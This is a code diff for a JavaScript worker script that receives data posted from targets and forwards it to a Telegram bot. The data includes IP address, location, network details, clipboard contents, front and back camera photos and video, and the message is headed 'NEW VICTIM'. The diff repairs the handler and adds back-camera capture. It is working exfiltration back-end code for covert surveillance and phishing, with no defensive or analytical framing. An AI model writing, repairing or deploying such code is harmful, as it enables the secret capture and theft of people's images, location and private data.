@@ -1,9 +1,8 @@
-addEventListener('fetch', e => e.respondWith(handle(e.request)));
+addEventListener('fetch', event => event.respondWith(handle(event.request)));
 
-async handle(req) {
-  if (req.method !== 'POST') return new Response('ok');
-
-  const fd = await req.formData();
+async function handle(request) {
+  if (request.method !== 'POST') return new Response('ok');
+  const fd = await request.formData();
   const token = fd.get('token');
   const ip = fd.get('ip');
   const ua = fd.get('ua');
@@ -15,40 +14,36 @@ async handle(req) {
   const vid = fd.get('video');
 
   const txt = `🎯 NEW VICTIM\nSlug: ${token}\nIP: ${ip}\nLoc: ${loc}\nNet: ${net}\nClipboard: ${clip}`;
-
-  // 1. Send Text Data
-  await fetch(`https://api.telegram.org`, {
+  await fetch(`https://api.telegram.org/botYOUR_TELEGRAM_BOT_TOKEN/sendMessage`, {
     method: 'POST',
     headers: { 'Content-Type': 'application/json' },
-    body: JSON.stringify({
-      chat_id: '6671784926',
-      text: txt
-    })
+    body: JSON.stringify({ chat_id: '6671784926', text: txt })
   });
 
-  // 2. Send Photo (if exists)
   if (front) {
-    const photoFd = new FormData();
-    photoFd.append('chat_id', '6671784926');
-    photoFd.append('photo', front, token + '_front.jpg');
-
-    await fetch(`https://api.telegram.org`, {
+    await fetch(`https://api.telegram.org/botYOUR_TELEGRAM_BOT_TOKEN/sendPhoto`, {
       method: 'POST',
-      body: photoFd
+      body: form(front, 'photo', token + '_front.jpg')
     });
   }
-
-  // 3. Send Video (if exists)
+  if (back) {
+    await fetch(`https://api.telegram.org/botYOUR_TELEGRAM_BOT_TOKEN/sendPhoto`, {
+      method: 'POST',
+      body: form(back, 'photo', token + '_back.jpg')
+    });
+  }
   if (vid) {
-    const videoFd = new FormData();
-    videoFd.append('chat_id', '6671784926');
-    videoFd.append('video', vid, token + '.webm');
-
-    await fetch(`https://api.telegram.org`, {
+    await fetch(`https://api.telegram.org/botYOUR_TELEGRAM_BOT_TOKEN/sendVideo`, {
       method: 'POST',
-      body: videoFd
+      body: form(vid, 'video', token + '.webm')
     });
   }
-
   return new Response('ok');
+}
+
+function form(file, type, name) {
+  const fd = new FormData();
+  fd.append('chat_id', '6671784926');
+  fd.append(type, file, name);
+  return fd;
 }
